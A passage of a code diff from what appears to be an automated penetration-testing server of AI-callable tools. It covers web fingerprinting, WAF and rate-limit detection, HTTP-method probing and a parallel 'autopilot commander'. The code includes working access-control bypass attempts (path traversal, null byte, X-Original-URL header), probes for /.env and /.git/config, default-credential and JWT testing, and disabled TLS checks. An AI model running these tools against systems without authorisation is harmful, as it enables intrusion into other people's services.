-                headers = dict(resp.headers)
-                body = resp.read(4096).decode("utf-8", errors="ignore")
-                
-                # Stack detection from headers
-                server = headers.get("Server", "").lower()
-                powered = headers.get("X-Powered-By", "").lower()
-                
-                if "nginx" in server:
-                    profile_data["stack"]["server"] = "nginx"
-                elif "apache" in server:
-                    profile_data["stack"]["server"] = "apache"
-                elif "cloudflare" in server:
-                    profile_data["stack"]["server"] = "cloudflare"
-                    profile_data["cloud"]["provider"] = "cloudflare"
-                
-                if "express" in powered:
-                    profile_data["stack"]["framework"] = "express"
-                    profile_data["stack"]["language"] = "node"
-                elif "php" in powered:
-                    profile_data["stack"]["language"] = "php"
-                elif "asp.net" in powered:
-                    profile_data["stack"]["framework"] = "asp.net"
-                    profile_data["stack"]["language"] = "csharp"
-                
-                # Cloud detection from headers
-                for h_key, h_val in headers.items():
-                    h_lower = h_key.lower()
-                    if "x-amz" in h_lower or "x-aws" in h_lower:
-                        profile_data["cloud"]["provider"] = "aws"
-                    elif "x-goog" in h_lower or "x-cloud" in h_lower:
-                        profile_data["cloud"]["provider"] = "gcp"
-                    elif "x-ms" in h_lower or "x-azure" in h_lower:
-                        profile_data["cloud"]["provider"] = "azure"
-                
-                # Tech detection from body
-                if "react" in body.lower() or "next" in body.lower():
-                    profile_data["stack"]["frontend"] = "react"
-                elif "vue" in body.lower():
-                    profile_data["stack"]["frontend"] = "vue"
-                elif "angular" in body.lower():
-                    profile_data["stack"]["frontend"] = "angular"
-                
-                # WAF detection
-                if headers.get("cf-ray"):
-                    pentest_memory.store_finding(target, "autopilot", "waf", "cloudflare")
-                elif any("awselb" in str(v).lower() for v in headers.values()):
-                    pentest_memory.store_finding(target, "autopilot", "waf", "aws_alb")
-                
-                # Store all findings in memory
-                for key, val in profile_data["stack"].items():
-                    pentest_memory.store_finding(target, "autopilot", "stack", {key: val})
-                if profile_data["cloud"]:
-                    pentest_memory.store_finding(target, "autopilot", "cloud", profile_data["cloud"])
-                
-                # Rate limit detection
-                rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers)
-                if rate_info.get("rate_limited"):
-                    results["rate_limit_status"] = rate_info
-                    
-        except (urllib.error.HTTPError, urllib.error.URLError, Exception) as e:
-            profile_data["error"] = str(e)
-        
-        # Step 2: Select playbook
-        if playbook == "auto":
-            context = pentest_memory.get_context(target)
-            playbook = PlaybookEngine.recommend_playbook(context if context else profile_data)
-            pentest_memory.decide(target, f"Selected playbook: {playbook}", 
-                                  f"Based on stack={profile_data.get('stack')}, cloud={profile_data.get('cloud')}")
-        
-        results["playbook_used"] = playbook
-        selected_playbook = PlaybookEngine.get_playbook(playbook)
-        
-        if not selected_playbook:
-            selected_playbook = PlaybookEngine.get_playbook("web_full")
-            playbook = "web_full"
-        
-        # Step 3: Execute stages
-        stages = selected_playbook.get("stages", [])[:max_stages]
-        
-        for i, stage in enumerate(stages):
-            stage_name = stage["name"]
-            progress.update(f"Stage {i+1}/{len(stages)}: {stage_name}")
-            
-            # Check rate limits before proceeding
-            if respect_rate_limits and rate_limit_detector.is_rate_limited(target):
-                delay = rate_limit_detector.get_recommended_delay(target)
-                pentest_memory.decide(target, f"Pausing {delay}s", "Rate limit detected")
-                await asyncio.sleep(min(delay, 5))  # Cap at 5s in autopilot
-            
-            stage_result = {
-                "stage": stage_name,
-                "tools_planned": stage["tools"],
-                "tools_executed": [],
-                "findings": [],
-            }
-            
-            for tool_name in stage["tools"]:
-                try:
-                    # Simulate tool execution summary (actual execution happens via individual tool calls)
-                    tool_summary = {
-                        "tool": tool_name,
-                        "status": "recommended",
-                        "reason": f"Part of {playbook}/{stage_name} stage",
-                    }
-                    
-                    # Get stack-adapted config for tool
-                    stack_config = orchestrator.adapt_to_stack(target)
-                    if stack_config.get("priority_tests") and tool_name in stack_config["priority_tests"]:
-                        tool_summary["priority"] = "HIGH — stack-specific"
-                    
-                    stage_result["tools_executed"].append(tool_summary)
-                    
-                except Exception as e:
-                    stage_result["tools_executed"].append({
-                        "tool": tool_name, "status": "error", "error": str(e)
-                    })
-            
-            results["stages_completed"].append(stage_result)
-        
-        # Step 4: Generate intelligent recommendations
-        progress.update("Generating recommendations")
-        recommendations = orchestrator.recommend_next_tools(target)
-        results["recommendations"] = recommendations
-        
-        # Step 5: Compile decisions
-        results["decisions"] = pentest_memory.get_decisions(target)
-        
-        # Stack-specific guidance
-        stack_config = orchestrator.adapt_to_stack(target)
-        results["stack_adapted_config"] = {
-            "additional_wordlists": stack_config.get("wordlists", [])[:10],
-            "recommended_payloads": stack_config.get("payloads", []),
-            "priority_tests": stack_config.get("priority_tests", []),
-        }
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"AutoPilot completed {len(results['stages_completed'])} stages using '{playbook}' playbook. "
-            f"Generated {len(recommendations)} follow-up recommendations. "
-            f"Stack detected: {profile_data.get('stack', {})}. "
-            f"Cloud: {profile_data.get('cloud', {})}."
-        )
-        
+            # Kill chain progress
+            results["kill_chain"] = kc
+            # All findings
+            results["findings"] = all_findings[:100]
+            # Structured vulnerability list with CVSS
+            vuln_list = vuln_correlator.get_vulns(target)
+            results["vulnerabilities"] = [
+                {"id": v.vuln_id, "title": v.title, "severity": v.severity,
+                 "cvss": v.cvss_score, "port": v.port, "exploitable": v.exploitable,
+                 "mitre": v.mitre_techniques, "remediation": v.remediation}
+                for v in sorted(vuln_list, key=lambda x: x.cvss_score, reverse=True)
+            ][:50]
+            results["recommendations"] = orchestrator.recommend_next_tools(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
     except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("autopilot_scan complete", results)
-    return json.dumps(results, indent=2, default=str)
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
 
 
-@mcp.tool()
-@resolve_references
-async def adaptive_recon(
-    target: str,
-    depth: str = "normal",
-    adapt_to_findings: bool = True,
-    timeout: int = 300
-) -> str:
-    """
-    Smart reconnaissance that profiles target, detects stack/cloud/WAF,
-    then adapts scanning strategy in real-time. Goes deeper when it finds
-    interesting signals (405/422/403 responses).
-    
-    Depth: quick (surface only), normal (with adaptation), deep (aggressive + bypass)
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 300)
-    trace, progress, exec_dir = _init_tool_context("adaptive_recon", target, 8)
-    
-    results = {
-        "target": target, "depth": depth,
-        "profile": {}, "endpoints_discovered": [],
-        "interesting_responses": [], "bypass_results": [],
-        "stack_detection": {}, "cloud_detection": {},
-        "waf_detection": {}, "rate_limit_info": {},
-        "contextual_actions": [], "next_steps": [],
-    }
-    
-    try:
-        import urllib.request, urllib.error, ssl
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        # Phase 1: Initial fingerprint
-        progress.update("Phase 1: HTTP fingerprinting")
-        trace.command(f"adaptive_recon target={target} depth={depth}")
-        
-        headers_detected = {}
-        try:
-            req = urllib.request.Request(base_url, method="GET")
-            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
-                headers_detected = dict(resp.headers)
-                body = resp.read(8192).decode("utf-8", errors="ignore")
-                
-                # Deep header analysis
-                for h_key, h_val in headers_detected.items():
-                    pentest_memory.store_finding(target, "adaptive_recon", "header", {h_key: h_val})
-                
-                # Stack detection
-                stack = {}
-                server = headers_detected.get("Server", "")
-                powered = headers_detected.get("X-Powered-By", "")
-                
-                if server:
-                    stack["server"] = server
-                if powered:
-                    stack["powered_by"] = powered
-                
-                # Framework detection from response patterns
-                if "X-Request-Id" in headers_detected:
-                    stack["has_request_id"] = True
-                if any("go" in str(v).lower() for v in headers_detected.values()):
-                    stack["language"] = "golang"
-                if "Strict-Transport-Security" in headers_detected:
-                    stack["hsts"] = True
-                
-                # Body analysis for tech detection
-                tech_patterns = {
-                    "react": r"react|__NEXT_DATA__|_next/static",
-                    "vue": r"vue|__vue__|nuxt",
-                    "angular": r"angular|ng-version",
-                    "spring_boot": r"Whitelabel Error|Spring|actuator",
-                    "django": r"csrfmiddlewaretoken|django",
-                    "laravel": r"laravel_session|XSRF-TOKEN",
-                    "wordpress": r"wp-content|wp-includes|wordpress",
-                    "express": r"express|x-powered-by.*express",
-                }
-                
-                for tech, pattern in tech_patterns.items():
-                    if re.search(pattern, body, re.IGNORECASE):
-                        stack["frontend" if tech in ["react", "vue", "angular"] else "framework"] = tech
-                        pentest_memory.store_finding(target, "adaptive_recon", "technology", tech)
-                
-                results["stack_detection"] = stack
-                pentest_memory.store_finding(target, "adaptive_recon", "stack", stack)
-                
-                # Cloud detection
-                cloud = {}
-                all_headers_str = str(headers_detected).lower()
-                if "x-amz" in all_headers_str or "amazons3" in all_headers_str:
-                    cloud["provider"] = "aws"
-                elif "x-goog" in all_headers_str or "gcs" in all_headers_str:
-                    cloud["provider"] = "gcp"
-                elif "x-ms" in all_headers_str or "azure" in all_headers_str:
-                    cloud["provider"] = "azure"
-                elif "cf-ray" in all_headers_str:
-                    cloud["cdn"] = "cloudflare"
-                
-                results["cloud_detection"] = cloud
-                if cloud:
-                    pentest_memory.store_finding(target, "adaptive_recon", "cloud", cloud)
-                
-                # WAF detection
-                waf = None
-                if headers_detected.get("cf-ray"):
-                    waf = "cloudflare"
-                elif "x-sucuri" in all_headers_str:
-                    waf = "sucuri"
-                elif "x-cdn" in all_headers_str and "incapsula" in all_headers_str:
-                    waf = "imperva"
-                elif any("awselb" in str(v).lower() for v in headers_detected.values()):
-                    waf = "aws_alb_waf"
-                elif "akamai" in all_headers_str:
-                    waf = "akamai"
-                
-                if waf:
-                    results["waf_detection"] = {"type": waf, "bypass_recommended": True}
-                    pentest_memory.store_finding(target, "adaptive_recon", "waf", waf)
-                
-                # Rate limit check from initial response
-                rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers_detected)
-                results["rate_limit_info"] = rate_info
-                
-        except urllib.error.HTTPError as e:
-            results["profile"]["initial_error"] = f"HTTP {e.code}"
-            headers_detected = dict(e.headers) if hasattr(e, 'headers') else {}
-        except Exception as e:
-            results["profile"]["initial_error"] = str(e)
-        
-        # Phase 2: Intelligent endpoint probing (adapted to detected stack)
-        progress.update("Phase 2: Stack-adapted endpoint probing")
-        
-        stack_config = orchestrator.adapt_to_stack(target)
-        probe_paths = stack_config.get("wordlists", [])
-        
-        # Always probe these universal paths
-        universal_paths = [
-            "/robots.txt", "/sitemap.xml", "/.env", "/api", "/admin",
-            "/login", "/graphql", "/.git/config", "/swagger-ui.html",
-        ]
-        probe_paths = list(set(universal_paths + probe_paths[:15]))
-        
-        interesting = []
-        for path in probe_paths[:20]:  # Limit to 20 probes
-            try:
-                probe_url = f"{base_url.rstrip('/')}{path}"
-                req = urllib.request.Request(probe_url, method="GET")
-                req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
-                        status = resp.status
-                        if status == 200:
-                            content_len = len(resp.read(1024))
-                            interesting.append({
-                                "path": path, "status": 200, "size": content_len,
-                                "significance": "accessible"
-                            })
-                            pentest_memory.store_finding(target, "adaptive_recon", "endpoint", path)
-                except urllib.error.HTTPError as e:
-                    status = e.code
-                    if status in [401, 403, 405, 422, 500]:
-                        entry = {"path": path, "status": status}
-                        
-                        # Contextual analysis
-                        actions = orchestrator.analyze_response_code(target, path, status)
-                        if actions:
-                            entry["follow_up_actions"] = actions
-                            results["contextual_actions"].extend(actions)
-                        
-                        interesting.append(entry)
-                        pentest_memory.store_finding(target, "adaptive_recon", "response_code", (path, status))
-                        
-                # Rate limit adaptation
-                rate_limit_detector.log_request(target)
-                if rate_limit_detector.is_rate_limited(target):
-                    delay = rate_limit_detector.get_recommended_delay(target)
-                    await asyncio.sleep(min(delay, 2))
-                    
-            except Exception:
-                continue
-        
-        results["interesting_responses"] = interesting
-        
-        # Phase 3: Deep adaptation (if depth != quick)
-        if depth in ["normal", "deep"] and adapt_to_findings:
-            progress.update("Phase 3: Contextual deep probing")
-            
-            # 403 bypass attempts on discovered forbidden paths
-            forbidden_paths = [r["path"] for r in interesting if r.get("status") == 403]
-            
-            if forbidden_paths and depth == "deep":
-                bypass_results = []
-                for fpath in forbidden_paths[:3]:  # Top 3 403 paths
-                    bypass_techniques = [
-                        {"method": "path_append_slash", "path": fpath + "/"},
-                        {"method": "case_change", "path": fpath.upper()},
-                        {"method": "path_traversal", "path": fpath + "/..;/"},
-                        {"method": "null_byte", "path": fpath + "%00"},
-                        {"method": "header_bypass", "path": fpath, "header": ("X-Original-URL", fpath)},
-                    ]
-                    
-                    for technique in bypass_techniques:
-                        try:
-                            bypass_url = f"{base_url.rstrip('/')}{technique['path']}"
-                            req = urllib.request.Request(bypass_url, method="GET")
-                            req.add_header("User-Agent", "Mozilla/5.0")
-                            
-                            if technique.get("header"):
-                                req.add_header(technique["header"][0], technique["header"][1])
-                            
-                            try:
-                                with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
-                                    if resp.status == 200:
-                                        bypass_results.append({
-                                            "original_path": fpath,
-                                            "technique": technique["method"],
-                                            "result": "BYPASS SUCCESSFUL",
-                                            "severity": "HIGH",
-                                        })
-                                        pentest_memory.store_finding(target, "adaptive_recon", "bypass_success", technique)
-                            except urllib.error.HTTPError as e:
-                                if e.code != 403:  # Different response = partial bypass
-                                    bypass_results.append({
-                                        "original_path": fpath,
-                                        "technique": technique["method"],
-                                        "result": f"Different response: {e.code}",
-                                    })
-                        except Exception:
-                            continue
-                
-                results["bypass_results"] = bypass_results
-        
-        # Phase 4: Generate next steps
-        progress.update("Phase 4: Generating intelligent recommendations")
-        
-        next_steps = orchestrator.recommend_next_tools(target)
-        results["next_steps"] = next_steps
-        
-        # Summary
-        results["status"] = "success"
-        results["summary"] = (
-            f"Adaptive recon complete. "
-            f"Stack: {results['stack_detection']}. "
-            f"Cloud: {results['cloud_detection']}. "
-            f"WAF: {results['waf_detection']}. "
-            f"Interesting endpoints: {len(interesting)}. "
-            f"Bypass attempts: {len(results.get('bypass_results', []))}. "
-            f"Next recommended tools: {len(next_steps)}."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("adaptive_recon complete", results)
-    return json.dumps(results, indent=2, default=str)
-
+# ============================================================================
+# MODULE 18: AUTOPILOT COMMANDER
+# ============================================================================
 
 @mcp.tool()
-@resolve_references
-async def rate_limit_detector_tool(
-    target: str,
-    requests_count: int = 20,
-    interval_ms: int = 100,
-    timeout: int = 60
+async def autopilot_commander(
+    target: str, depth: str = "deep", scope: str = "web",
+    max_duration: int = 1800, aggressive: bool = False,
 ) -> str:
-    """
-    Active rate limit detection and adaptation. Sends calibrated bursts to
-    detect rate limiting thresholds, then recommends optimal scan speed.
-    Detects: HTTP 429, Retry-After, X-RateLimit-*, Cloudflare blocks, AWS WAF.
-    """
+    """Autonomous pentest orchestrator with kill-chain tracking, parallel execution,
+    cross-module correlation, dynamic CVSS scoring, and MITRE ATT&CK mapping.
+    scope: web|network|cloud|internal|full|api|wireless
+    Runs independent modules in PARALLEL, chains findings automatically,
+    builds attack paths, and produces executive-level risk assessment."""
     target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 60)
-    trace, progress, exec_dir = _init_tool_context("rate_limit_detector", target, 5)
-    
-    results = {
-        "target": target,
-        "requests_sent": 0,
-        "rate_limit_detected": False,
-        "limit_details": {},
-        "response_timeline": [],
-        "recommended_delay": 0.3,
-        "waf_blocking": False,
-        "headers_observed": {},
-    }
-    
+    execution = session_manager.start_execution("autopilot_commander", target, {"scope": scope, "depth": depth})
+    results = {"target": target, "scope": scope, "depth": depth, "phases": {}, "timeline": [],
+               "parallel_executions": 0, "intelligence": {}}
     try:
-        import urllib.request, urllib.error, ssl
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        progress.update("Sending calibrated request burst")
-        trace.command(f"rate_limit_detector target={target} count={requests_count}")
-        
-        interval_sec = interval_ms / 1000.0
-        responses = []
-        
-        for i in range(min(requests_count, 50)):  # Cap at 50
-            start_time = time.time()
-            try:
-                req = urllib.request.Request(base_url, method="GET")
-                req.add_header("User-Agent", f"Mozilla/5.0 (RateTest/{i})")
-                req.add_header("X-Request-ID", str(i))
-                
-                try:
-                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                        elapsed = time.time() - start_time
-                        headers = dict(resp.headers)
-                        
-                        entry = {
-                            "request_num": i + 1,
-                            "status": resp.status,
-                            "time_ms": round(elapsed * 1000, 1),
-                        }
-                        
-                        # Check for rate limit headers
-                        rate_info = rate_limit_detector.detect_from_response(target, resp.status, headers)
-                        if rate_info.get("limit") or rate_info.get("remaining") is not None:
-                            entry["rate_headers"] = rate_info
-                            results["headers_observed"].update({
-                                k: v for k, v in headers.items() 
-                                if "rate" in k.lower() or "limit" in k.lower() or "retry" in k.lower()
-                            })
-                        
-                        responses.append(entry)
-                        
-                except urllib.error.HTTPError as e:
-                    elapsed = time.time() - start_time
-                    headers = dict(e.headers) if hasattr(e, 'headers') else {}
-                    
-                    entry = {
-                        "request_num": i + 1,
-                        "status": e.code,
-                        "time_ms": round(elapsed * 1000, 1),
-                    }
-                    
-                    if e.code == 429:
-                        results["rate_limit_detected"] = True
-                        entry["rate_limited"] = True
-                        rate_info = rate_limit_detector.detect_from_response(target, e.code, headers)
-                        results["limit_details"] = rate_info
-                        entry["rate_headers"] = rate_info
-                    
-                    elif e.code == 403:
-                        # Possible WAF block
-                        if i > 5:  # Only after several requests
-                            results["waf_blocking"] = True
-                            entry["possible_waf_block"] = True
-                    
-                    responses.append(entry)
-                    
-                    # If rate limited, stop burst
-                    if e.code == 429:
-                        break
-                
-                rate_limit_detector.log_request(target)
-                results["requests_sent"] = i + 1
-                
-            except Exception as e:
-                responses.append({"request_num": i + 1, "error": str(e)})
-            
-            await asyncio.sleep(interval_sec)
-        
-        # Analysis
-        progress.update("Analyzing rate limit patterns")
-        
-        # Check for progressive slowdown (response times increasing)
-        if len(responses) > 5:
-            first_5_avg = sum(r.get("time_ms", 0) for r in responses[:5]) / 5
-            last_5_avg = sum(r.get("time_ms", 0) for r in responses[-5:]) / 5
-            
-            if last_5_avg > first_5_avg * 2:
-                results["rate_limit_detected"] = True
-                results["limit_details"]["type"] = "progressive_slowdown"
-                results["limit_details"]["slowdown_factor"] = round(last_5_avg / max(first_5_avg, 1), 2)
-        
-        # Check for status code changes
-        status_codes = [r.get("status") for r in responses if r.get("status")]
-        if 429 in status_codes:
-            trigger_point = status_codes.index(429) + 1
-            results["limit_details"]["trigger_at_request"] = trigger_point
-            results["limit_details"]["estimated_limit"] = trigger_point
-        
-        # Store only last 10 in timeline (summary)
-        results["response_timeline"] = responses[-10:] if len(responses) > 10 else responses
-        results["total_responses"] = len(responses)
-        
-        # Calculate recommended delay
-        results["recommended_delay"] = rate_limit_detector.get_recommended_delay(target)
-        
-        # Store in memory
-        pentest_memory.store_finding(target, "rate_limit_detector", "rate_limit", results["limit_details"])
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"Sent {results['requests_sent']} requests. "
-            f"Rate limit detected: {results['rate_limit_detected']}. "
-            f"WAF blocking: {results['waf_blocking']}. "
-            f"Recommended delay: {results['recommended_delay']}s between requests."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("rate_limit_detector complete", results)
-    return json.dumps(results, indent=2, default=str)
+        start_time = time.time()
+        d = "aggressive" if aggressive else depth
+        phase_timeout = min(300, max_duration // 4)
 
+        def log_phase(name, data, parallel=False):
+            elapsed = round(time.time() - start_time, 1)
+            results["timeline"].append({"phase": name, "elapsed_s": elapsed, "parallel": parallel})
+            results["phases"][name] = {"status": "completed", "summary": str(data)[:500]}
 
-@mcp.tool()
-@resolve_references
-async def intelligent_405_bypass(
-    target: str,
-    endpoint: str = "/api",
-    timeout: int = 120
-) -> str:
-    """
-    When an endpoint returns 405 (Method Not Allowed), this tool intelligently
-    tests ALL HTTP methods with various content-types and body formats to find
-    accepted combinations. Adapts payloads based on detected stack.
-    """
-    target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 120)
-    trace, progress, exec_dir = _init_tool_context("intelligent_405_bypass", target, 6)
-    
-    results = {
-        "target": target, "endpoint": endpoint,
-        "methods_tested": [], "successful_methods": [],
-        "interesting_responses": [], "next_steps": [],
-    }
-    
-    try:
-        import urllib.request, urllib.error, ssl
-        
-        base_url = target if target.startswith("http") else f"https://{target}"
-        full_url = f"{base_url.rstrip('/')}{endpoint}"
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        
-        progress.update("Testing HTTP methods")
-        trace.command(f"intelligent_405_bypass {full_url}")
-        
-        # Methods to test
-        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]
-        
-        # Content types to try with body methods
-        content_types = [
-            ("application/json", '{"test": true}'),
-            ("application/x-www-form-urlencoded", "test=true"),
-            ("text/xml", "<test>true</test>"),
-            ("multipart/form-data; boundary=----Boundary", "------Boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\ntrue\r\n------Boundary--"),
-        ]
-        
-        # Get stack-specific payloads
-        stack = pentest_memory.get_stack(target)
-        if stack.get("framework") == "spring_boot" or stack.get("language") == "java":
-            content_types.append(("application/x-java-serialized-object", ""))
-        elif stack.get("language") == "php":
-            content_types.append(("application/x-php-serialized", 'a:1:{s:4:"test";b:1;}'))
-        
-        for method in methods:
-            if method in ["GET", "HEAD", "OPTIONS", "TRACE", "DELETE"]:
-                # No body methods
-                try:
-                    req = urllib.request.Request(full_url, method=method)
-                    req.add_header("User-Agent", "Mozilla/5.0")
-                    
-                    try:
-                        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                            entry = {
-                                "method": method, "status": resp.status,
-                                "content_type": resp.headers.get("Content-Type", ""),
-                                "content_length": resp.headers.get("Content-Length", "0"),
-                            }
-                            if resp.status in [200, 201, 204]:
-                                entry["result"] = "ACCEPTED"
-                                results["successful_methods"].append(entry)
-                            elif resp.status in [401, 403, 422]:
-                                entry["result"] = "EXISTS_BUT_RESTRICTED"
-                                results["interesting_responses"].append(entry)
-                            results["methods_tested"].append(entry)
-                    except urllib.error.HTTPError as e:
-                        entry = {"method": method, "status": e.code}
-                        if e.code in [401, 403, 422, 500]:
-                            entry["result"] = "INTERESTING"
-                            results["interesting_responses"].append(entry)
-                        results["methods_tested"].append(entry)
-                except Exception:
-                    continue
-            else:
-                # Body methods — try different content types
-                for ct, body in content_types:
-                    try:
-                        data = body.encode("utf-8") if body else b""
-                        req = urllib.request.Request(full_url, data=data, method=method)
-                        req.add_header("User-Agent", "Mozilla/5.0")
-                        req.add_header("Content-Type", ct)
-                        
-                        try:
-                            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
-                                entry = {
-                                    "method": method, "content_type": ct,
-                                    "status": resp.status,
-                                    "response_type": resp.headers.get("Content-Type", ""),
-                                }
-                                if resp.status in [200, 201, 204]:
-                                    entry["result"] = "ACCEPTED"
-                                    results["successful_methods"].append(entry)
-                                elif resp.status == 422:
-                                    entry["result"] = "VALIDATION_ERROR — endpoint accepts this method but needs correct body"
-                                    results["interesting_responses"].append(entry)
-                                results["methods_tested"].append(entry)
-                        except urllib.error.HTTPError as e:
-                            entry = {"method": method, "content_type": ct, "status": e.code}
-                            if e.code == 422:
-                                entry["result"] = "ACCEPTS_METHOD — needs correct parameters"
-                                results["interesting_responses"].append(entry)
-                            elif e.code in [401, 403, 500]:
-                                entry["result"] = "INTERESTING"
-                                results["interesting_responses"].append(entry)
-                            results["methods_tested"].append(entry)
-                    except Exception:
-                        continue
-            
-            # Rate limit awareness
-            rate_limit_detector.log_request(target)
-            if rate_limit_detector.is_rate_limited(target):
-                await asyncio.sleep(rate_limit_detector.get_recommended_delay(target))
-        
-        # Generate next steps based on findings
-        progress.update("Analyzing results")
-        
-        for resp in results["interesting_responses"]:
-            if resp.get("status") == 422:
-                results["next_steps"].append({
-                    "action": "Fuzz request body parameters",
-                    "method": resp.get("method"),
-                    "content_type": resp.get("content_type"),
-                    "reason": "422 indicates the endpoint accepts this method but needs specific parameters",
-                    "suggested_tool": "context_fuzzer",
-                })
-            elif resp.get("status") == 401:
-                results["next_steps"].append({
-                    "action": "Test authentication bypass",
-                    "method": resp.get("method"),
-                    "reason": "401 means endpoint exists and requires auth — test JWT none, default creds",
-                    "suggested_tool": "enhanced_jwt_analyzer",
-                })
-        
-        # Store findings in memory
-        for success in results["successful_methods"]:
-            pentest_memory.store_finding(target, "intelligent_405_bypass", "endpoint", 
-                                         f"{endpoint} [{success['method']}]")
-        
-        results["status"] = "success"
-        results["summary"] = (
-            f"Tested {len(results['methods_tested'])} method/content-type combinations. "
-            f"Successful: {len(results['successful_methods'])}. "
-            f"Interesting: {len(results['interesting_responses'])}. "
-            f"Next steps: {len(results['next_steps'])}."
-        )
-        
-    except Exception as e:
-        results["status"] = "error"
-        results["error"] = str(e)
-    
-    trace.command("intelligent_405_bypass complete", results)
-    return json.dumps(results, indent=2, default=str)
+        def time_left():
+            return max_duration - (time.time() - start_time)
 
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 1: RECONNAISSANCE (sequential — needed before others)
+        # ═══════════════════════════════════════════════════════════════
+        if time_left() > 0:
+            recon = await recon_engine(target=target, depth=d, timeout=phase_timeout)
+            recon_data = json.loads(recon)
+            n_ports = len(recon_data.get("modules", {}).get("nmap", {}).get("open_ports", []))
+            log_phase("recon", f"Ports:{n_ports}, Risk:{recon_data.get('intelligence_summary', {}).get('risk_rating', '?')}")
 
-@mcp.tool()
-@resolve_references
-async def pentest_memory_query(
-    target: str,
-    query_type: str = "full_context"
-) -> str:
-    """
-    Query the intelligent memory system for accumulated findings about a target.
-    Returns all stored knowledge: stack, vulns, endpoints, rate limits, decisions.
-    
-    Query types: full_context, recommendations, vulns, stack, decisions, rate_limits
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("pentest_memory_query", target, 3)
-    
-    results = {"target": target, "query_type": query_type}
-    
-    try:
-        progress.update("Querying pentest memory")
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 2: PARALLEL SURFACE SCANNING (independent scans together)
+        # ═══════════════════════════════════════════════════════════════
+        parallel_tasks = []
+        if scope in ["web", "full", "api"] and time_left() > 0:
+            parallel_tasks.append({"name": "web_assault",
+                                    "coro": web_assault(target=target, depth=d, timeout=phase_timeout),
+                                    "timeout": phase_timeout})
+            parallel_tasks.append({"name": "api_breaker",
+                                    "coro": api_breaker(target=target, depth=d, timeout=phase_timeout),
+                                    "timeout": phase_timeout})
+        if scope in ["network", "internal", "full"] and time_left() > 0:
+            parallel_tasks.append({"name": "network_dominator",
+                                    "coro": network_dominator(target=target, depth=d, timeout=phase_timeout),
+                                    "timeout": phase_timeout})
+        if scope in ["cloud", "full"] and time_left() > 0:
+            parallel_tasks.append({"name": "cloud_siege",
+                                    "coro": cloud_siege(target=target, depth=d, timeout=phase_timeout),
+                                    "timeout": phase_timeout})
+        if scope in ["full"] and time_left() > 0:
+            parallel_tasks.append({"name": "osint_harvester",
+                                    "coro": osint_harvester(target=target, depth=d, timeout=phase_timeout),
+                                    "timeout": phase_timeout})
+
+        if parallel_tasks:
+            p_results = await parallel_executor.run_parallel(parallel_tasks, max_concurrent=5)
+            results["parallel_executions"] += len(parallel_tasks)
+            for pr in p_results:
+                log_phase(pr["name"], f"status={pr['status']}, elapsed={pr.get('elapsed_s', 0)}s", parallel=True)
+
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 3: VULNERABILITY SCANNING + AUTH TESTING (parallel)
+        # ═══════════════════════════════════════════════════════════════
+        vuln_tasks = []
+        if time_left() > 0:
+            vuln_tasks.append({"name": "vuln_scanner_ultra",
+                                "coro": vuln_scanner_ultra(target=target, depth=d, timeout=phase_timeout),
+                                "timeout": phase_timeout})
+        if scope in ["web", "full", "api"] and time_left() > 0:
+            vuln_tasks.append({"name": "auth_destroyer",
+                                "coro": auth_destroyer(target=target, depth=d,
+                                                        modules="default_creds,cors,header_bypass,path_mutation,jwt",
+                                                        timeout=phase_timeout),
+                                "timeout": phase_timeout})
+        if vuln_tasks:
+            v_results = await parallel_executor.run_parallel(vuln_tasks, max_concurrent=3)
+            results["parallel_executions"] += len(vuln_tasks)
+            for vr in v_results:
+                log_phase(vr["name"], f"status={vr['status']}", parallel=True)
+
+        # ═══════════════════════════════════════════════════════════════
+        # PHASE 4: TARGETED ATTACKS (based on correlation analysis)
+        # ═══════════════════════════════════════════════════════════════
+        correlation = vuln_correlator.correlate(target)
         context = pentest_memory.get_context(target)
-        
-        if query_type == "full_context":
-            results["context"] = context
-            results["decisions"] = pentest_memory.get_decisions(target)
-            results["rate_limits"] = rate_limit_detector.get_status(target)
-            results["recommendations"] = orchestrator.recommend_next_tools(target)
-        
-        elif query_type == "recommendations":
-            results["recommendations"] = orchestrator.recommend_next_tools(target)
-            results["stack_config"] = orchestrator.adapt_to_stack(target)
-        
-        elif query_type == "vulns":
-            results["vulnerabilities"] = pentest_memory.get_vulns(target)
-        
-        elif query_type == "stack":
-            results["stack"] = pentest_memory.get_stack(target)
